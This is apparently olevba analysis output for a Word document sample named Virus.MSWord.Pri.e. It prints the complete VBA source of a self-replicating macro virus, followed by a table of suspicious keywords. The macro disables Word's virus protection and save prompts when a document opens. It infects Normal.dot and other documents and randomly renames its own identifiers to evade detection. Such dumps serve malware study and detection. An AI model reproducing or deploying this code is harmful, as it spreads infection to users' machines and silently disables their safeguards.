olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.e-95d158d564305ed1fb0abd82e7a2edba8ffc3732
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.e-95d158d564305ed1fb0abd82e7a2edba8ffc3732 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If 99999 = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
RD5051 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UH326 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set JH2131 = ActiveDocument.VBProject.VBComponents.Item(1)
KG8744 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set JH2131 = NormalTemplate.VBProject.VBComponents.Item(1)
IB5392 = True
Call QF7755_EA4393
ActiveDocument.Saved = True
End If
If IB5392 <> True And KG8744 <> True Then GoTo CH4811
If IB5392 = True Then JH2131.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RD5051 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If KG8744 = True Then JH2131.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UH326 - 3))
CH4811:
If UH326 <> 0 And RD5051 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function QF7755_EA4393()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "MT7964": r1(2) = "EF1851": r1(3) = "QF2046": r1(4) = "DK3675": r1(5) = "EA4393": r1(6) = "RD5051"
r1(7) = "UH326": r1(8) = "KG8744":: r1(9) = "JH2131": r1(10) = "IB5392": r1(11) = "CH4811": r1(12) = "QF7755": r1(13) = "QM9930": r1(14) = "KM6758"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EA4393(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function EA4393(KM6758, QM9930 As String)
On Error Resume Next
Dim MT7964 As Long: Dim EF1851 As Long: Dim QF2046 As Long: Dim DK3675 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MT7964 = 1: EF1851 = 1: QF2046 = .CountOfLines: DK3675 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QM9930, MT7964, EF1851, QF2046, DK3675, True)
strline = .Lines(MT7964, 1)
strline = Left(strline, EF1851 - 1) & KM6758 & Mid(strline, DK3675)
.replaceline MT7964, strline
MT7964 = QF2046 + 1: EF1851 = 1:
QF2046 = .CountOfLines
DK3675 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

